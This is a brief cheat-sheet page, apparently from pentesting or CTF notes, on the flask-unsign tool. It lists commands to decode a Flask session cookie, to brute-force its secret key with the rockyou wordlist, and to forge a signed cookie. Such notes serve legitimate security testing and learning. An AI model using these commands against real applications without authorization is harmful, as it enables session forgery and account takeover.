---
title: "Flask Cookie"
date: 2024-6-27
tags: ["flask", "python", "cookie", "sign", "unsign"]
---

---
### flask-unsign

```bash
pip3 install flask-unsign
```

```bash
# Decode flask cookie
flask-unsign --decode --cookie <COOKIE>
```

```bash
# Brute force secret key
flask-unsign --unsign --cookie <COOKIE> -w /usr/share/wordlists/rockyou.txt --no-literal-eval
```

```bash
# Forge flask cookie
flask-unsign --sign --cookie <COOKIE_DATA> --secret <SECRET>
```

<br>